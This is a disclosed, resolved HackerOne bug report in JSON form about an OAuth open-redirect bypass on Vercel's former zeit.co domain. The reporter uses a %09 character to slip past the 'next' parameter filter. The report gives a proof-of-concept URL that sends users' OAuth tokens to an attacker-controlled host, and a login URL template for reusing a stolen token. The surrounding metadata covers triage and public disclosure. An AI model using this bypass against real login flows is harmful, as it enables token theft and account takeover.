{"id":763058,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjMwNTg=","url":"https://hackerone.com/reports/763058","title":"through %09 Character the attacker is able to steal Github Token [ Account Takeover ]","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-22T03:04:49.288Z","submitted_at":"2019-12-22T03:04:49.288Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"elmahdi","url":"/elmahdi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39174,"url":"https://hackerone.com/vercel","handle":"vercel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/174/6accbc4b10e3d000c0acf7de494fe725066475f4_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/174/6accbc4b10e3d000c0acf7de494fe725066475f4_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vercel","twitter_handle":"vercel","website":"https://vercel.com","about":"Creators of Next.js - Vercel is the platform for developing, previewing, and shipping Jamstack sites."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-08T18:13:16.308Z","bug_reporter_agreed_on_going_public_at":"2020-04-08T18:13:14.600Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n####Hello i've found the filter will deleted this `%09` character when checking the value parameter `next` in oauth which allow to attacker to bypass `Filter` and steal `Oauth Token` of user thats lead to account takeover !\n## Steps To Reproduce:\n####1. Go To `https://zeit.co/api/now/registration/gitlab/connect?mode=login\u0026next=https://zeit.co%09.159.65.226.38.xip.io/index.html` and your oauth token will redirect to my server !!\n####2. And the attacker can use the oauth token to sign in to To your account  through login endpoint\n`https://zeit.co/login?token=%5BVALUE%5D\u0026mode=login\u0026email=%5BVALUE%5D\u0026securityCode=%5BVALUE%5D\u0026confirmed=1\u0026username=%5BVALUE%5D\u0026loginType=gitlab And You Will Sign In To The Account`\n\n## Impact\n\n####Account Takeover !","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003ch4 id=\"hello-i-ve-found-the-filter-will-deleted-this-09-character-when-checking-the-value-parameter-next-in-oauth-which-allow-to-attacker-to-bypass-filter-and-steal-oauth-token-of-user-thats-lead-to-account-takeover\"\u003eHello i\u0026#39;ve found the filter will deleted this \u003ccode\u003e%09\u003c/code\u003e character when checking the value parameter \u003ccode\u003enext\u003c/code\u003e in oauth which allow to attacker to bypass \u003ccode\u003eFilter\u003c/code\u003e and steal \u003ccode\u003eOauth Token\u003c/code\u003e of user thats lead to account takeover !\u003c/h4\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003ch4 id=\"1-go-to-https-zeit-co-api-now-registration-gitlab-connect-mode-loginnext-https-zeit-co-09-159-65-226-38-xip-io-index-html-and-your-oauth-token-will-redirect-to-my-server\"\u003e1. Go To \u003ccode\u003ehttps://zeit.co/api/now/registration/gitlab/connect?mode=login\u0026amp;next=https://zeit.co%09.159.65.226.38.xip.io/index.html\u003c/code\u003e and your oauth token will redirect to my server !!\u003c/h4\u003e\n\n\u003ch4 id=\"2-and-the-attacker-can-use-the-oauth-token-to-sign-in-to-to-your-account-through-login-endpoint\"\u003e2. And the attacker can use the oauth token to sign in to To your account  through login endpoint\u003c/h4\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://zeit.co/login?token=%5BVALUE%5D\u0026amp;mode=login\u0026amp;email=%5BVALUE%5D\u0026amp;securityCode=%5BVALUE%5D\u0026amp;confirmed=1\u0026amp;username=%5BVALUE%5D\u0026amp;loginType=gitlab And You Will Sign In To The Account\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch4 id=\"account-takeover\"\u003eAccount Takeover !\u003c/h4\u003e\n","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-05-08T18:13:14.645Z","allow_singular_disclosure_after":-20262881.406770397,"singular_disclosure_allowed":true,"vote_count":42,"voters":["abudman","sourc7","w31rd0","s1r1u5","mik317","bitsscrambler","johndoe1492","dhakal_ananda","zeroxyele","mygf","and 32 more..."],"severity":{"rating":"high","score":7.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":23160,"asset_type":"URL","asset_identifier":"*.vercel.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6624263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Guys ?","markdown_message":"\u003cp\u003eHello Guys ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-25T04:51:59.660Z","updated_at":"2019-12-25T04:51:59.660Z","actor":{"username":"elmahdi","cleared":false,"url":"/elmahdi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6656483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Guys ?","markdown_message":"\u003cp\u003eHello Guys ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-30T09:28:13.589Z","updated_at":"2019-12-30T09:28:13.589Z","actor":{"username":"elmahdi","cleared":false,"url":"/elmahdi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6776574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Guys ?","markdown_message":"\u003cp\u003eHello Guys ?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-15T13:08:55.273Z","updated_at":"2020-01-15T13:08:55.273Z","actor":{"username":"elmahdi","cleared":false,"url":"/elmahdi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7061244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"?","markdown_message":"\u003cp\u003e?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-15T18:42:45.689Z","updated_at":"2020-02-15T18:42:45.689Z","actor":{"username":"elmahdi","cleared":false,"url":"/elmahdi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586463,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:08:51.859Z","updated_at":"2020-04-08T18:08:51.859Z","additional_data":{"duplicate_report_id":763108},"actor":{"username":"mik317","cleared":false,"url":"/mik317","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586466,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:09:08.461Z","updated_at":"2020-04-08T18:09:08.461Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586470,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:09:32.086Z","updated_at":"2020-04-08T18:09:32.086Z","additional_data":{"added_weaknesses":[{"id":53,"name":"Open Redirect"}],"removed_weaknesses":[]},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586473,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:10:17.242Z","updated_at":"2020-04-08T18:10:17.242Z","additional_data":{"old_severity":"High","new_severity":"High (7.4)","old_severity_id":594394,"new_severity_id":685277},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586476,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @elmahdi, \n\nWe have determined that this issue is now resolved. If you’re still able to reproduce this issue, please let us know and we will investigate further. \n\nThanks!\n@antenna ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/elmahdi\"\u003e@elmahdi\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eWe have determined that this issue is now resolved. If you’re still able to reproduce this issue, please let us know and we will investigate further. \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-08T18:10:36.734Z","updated_at":"2020-04-08T18:10:36.734Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"reporter":{"username":"elmahdi","url":"/elmahdi"},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586495,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:11:35.780Z","updated_at":"2020-04-08T18:11:35.780Z","additional_data":{"duplicate_report_id":770218},"actor":{"username":"sodium_","cleared":false,"url":"/sodium_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TjtkPTvS5hyePoHWZHHZym4i/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7586514,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-08T18:13:14.615Z","updated_at":"2020-04-08T18:13:14.615Z","first_to_agree":true,"actor":{"username":"elmahdi","cleared":false,"url":"/elmahdi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2ELVYJmBmxs8LKVuM7uvnqzp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7941073,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-08T18:13:16.363Z","updated_at":"2020-05-08T18:13:16.363Z","actor":{"url":"/vercel","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/174/6accbc4b10e3d000c0acf7de494fe725066475f4_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vercel"}},"genius_execution_id":null,"team_handle":"vercel","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}